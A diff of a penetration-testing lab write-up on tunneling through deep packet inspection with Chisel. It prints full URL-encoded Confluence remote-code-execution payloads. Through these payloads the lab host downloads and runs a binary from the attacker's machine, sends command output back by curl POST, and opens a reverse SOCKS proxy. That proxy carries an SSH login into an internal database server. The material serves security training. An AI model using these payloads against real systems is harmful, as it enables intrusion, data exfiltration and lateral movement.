@@ -108,6 +108,7 @@ Before starting the server we need to copy the Chisel client bin to CONFLUENCE01
 In this case both systems are AMD64 Linux, so we can use the same Chisel bin on both machines.
 
 To get Chisel bin onto CONFLUENCE01, we can serve it from our Kali machine over HTTP.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
 └─$ sudo cp $(which chisel) ./
@@ -118,12 +119,15 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 Next we build the `wget` command to download the `chisel` bin and make it executable.
+
 ```
 wget 192.168.45.182/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 ```
+
 - We will format the command to work with our `curl` Confluence injection payload.
 
 *As before, you can modify the specific parts of the URL-encoded RCE payload that you need to, rather than trying to build a new payload from scratch, to avoid formatting difficulties.*
+
 ```bash
 curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.182/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
 
@@ -134,6 +138,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 Now that we have the Chisel bin on both Kali and target machines, we can start the bin as a server with the `server` subcommand, bind port `--port`, and reverse port forward `--reverse` flag.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
 └─$ chisel server --port 8080 --reverse
@@ -145,6 +150,7 @@ Now that we have the Chisel bin on both Kali and target machines, we can start t
 The Chisel server starts and is listening on port 8080 as a reverse tunnel.
 
 Before we try to run the Chisel client, we'll run `tcpdump` to log incoming traffic on our Kali machine, filtering to `tcp port 8080`.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
 └─$ sudo tcpdump -nvvvXi tun0 tcp port 8080
@@ -157,11 +163,13 @@ We want to connect to our server running on our Kali machine `192.168.45.182:808
  - `socks` proxy, bound to `1080` by default.
 - `> /dev/null 2>&1 &` redirect to run in background.
  - So our injection does not hand waiting for the proc to finish.
+
 ```
 /tmp/chisel client 192.168.45.182:8080 R:socks > /dev/null 2>&1 &
 ```
 
 Convert into a Confluence injection payload.
+
 ```bash
 curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.182:8080%20R:socks%27%29.start%28%29%22%29%7D/
 ```
@@ -173,15 +181,19 @@ There may be something wrong with our Chisel client process on CONFLUENCE01, but
 - Write it to `/tmp/output`
 - Run `curl` with `--data` flag.
  - Reads file at `/tmp/output` and POST it back to our Kali machine.
+
 ```
 /tmp/chisel client 192.168.45.182:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.182:8080/
 ```
+
 Create our injection payload.
+
 ```bash
 curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.182:80%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.182:80/%27%29.start%28%29%22%29%7D/
 ```
 
 Check our Tcpdump output for the error message
+
 ```
     192.168.197.63.42126 > 192.168.45.182.80: Flags [P.], cksum 0x4289 (correct), seq 1:354, ack 1, win 502, options [nop,nop,TS val 2513796402 ecr 1856280942], length 353: HTTP, length: 353
 	POST / HTTP/1.1
@@ -194,6 +206,7 @@ Check our Tcpdump output for the error message
 	/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]
 	0x0000:  4500 0195 6b30 4000 3d06 5cec c0a8 c53f  E...k0@.=.\....?
 ```
+
 - Chisel is trying to use version 2.32 and 2.34 of `glibc`
  - Not present on CONFLUENCE01.
  - *This module is being written in 2023, using Chisel version 1.8.1-0kali2 (go1.20.7). The Kali repos will likely contains later versions of Chisel in the future, and the exact error message that comes back from these later versions of Chisel may be different. However, the same principle applies. We have encountered an error trying to run a payload on a target system. As such, we have to find an alternative payload which will run. Finding a way around these kinds of setbacks is an important skill which can be applied to many other situations where tool incompatibilities arise.*.
@@ -201,6 +214,7 @@ Check our Tcpdump output for the error message
 This indicates a version incompatibility, when the tool or component is newer than the OS it is trying to run on there's a risk that the OS will not contain the required technologies needed by the tool.
 
 Looking for a solution, we check the version info for the Chisel bin we have on our Kali system.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
 └─$ chisel -h                         
@@ -216,10 +230,12 @@ Looking for a solution, we check the version info for the Chisel bin we have on 
   Read more:
     https://github.com/jpillora/chisel
 ```
+
 - This is version 1.8.1 of Chisel, it has been compiles wth Go version 1.20.7.
 - Google biopsy reveals similar messages appear when bins compiled for Go V1.20 and later are run on OS that don't have compatible glibc.
 
 On the Chisel Github page we find an "official" compiled bin, also version 1.81 is compiled with Go version 1.19.  This is one version lower than the version that introduced the glibc incompatibility.  We can try using the Go 1.19 compiled Chisel 1.81 binary for Linux AMD64.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
 └─$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
@@ -232,16 +248,19 @@ On the Chisel Github page we find an "official" compiled bin, also version 1.81 
 ```
 
 After overwriting our Chisel bin with the older version, we redownload and overwrite the version on CONFLUENCE01.
+
 ```bash
 curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.182/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
 ```
 
 We can now try our Chisel client again.
+
 ```bash
 curl http://192.168.197.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.182:8080%20R:socks%27%29.start%28%29%22%29%7D/
 ```
 
 A different kind of traffic is logged in our Tcpdump session.
+
 ```
 tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 ...
@@ -278,9 +297,11 @@ tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 
     192.168.118.4.8080 > 192.168.50.63.41424: Flags [.], cksum 0x46ca (correct), seq 1, ack 225, win 508, options [nop,nop,TS ...
 ...
 ```
+
 - This indicates that Tcpdump has logged a HTTP Websocket connection.
 
 Our Chisel client has logged an inbound connection.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
 └─$ chisel server --port 8080 --reverse
@@ -292,6 +313,7 @@ Our Chisel client has logged an inbound connection.
 ```
 
 Check the status of our SOCKS proxy with `ss`.
+
 ```bash
                                                                                          
 ┌──(operator㉿labhost)-[~/OffSec/dpi-tunneling]
@@ -301,6 +323,7 @@ Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address
 tcp      LISTEN    0         4096             127.0.0.1:1080             0.0.0.0:*        users:(("chisel",pid=29641,fd=8))                                                       
 ...
 ```
+
 - Our SOCKS proxy is listening on port 1080 of lo iface.
 
 We can now use this to connect to the SSH server on PGDATABASE01.  Previously we created a SOCKS proxy with SSH, but haven't run SSH through a SOCKS proxy connection.
@@ -310,6 +333,7 @@ SSH doesn't have a SOCKS command line option, but it offers the ProxyCommand con
 The proxy command accepts a shell command to open a proxy-enabled channel.  The docs suggest using the OpenBSD version of Netcat with the `-X` flag which can connect to a SOCKS or HTTP proxy.  The version of Netcat that ships with Kali does not support proxying.
 
 We will use Ncat instead!
+
 ```bash
 ssh -o PubKeyAuthentication=no -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.197.215
 
@@ -340,4 +364,5 @@ To check for new updates run: sudo apt update
 Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
 database_admin@pgdatabase01:~$ 
 ```
+
 - We have gained access to the SSH server through our Chisel reverse SOCKS proxy by tunneling traffic through a reverse HTTP conn.
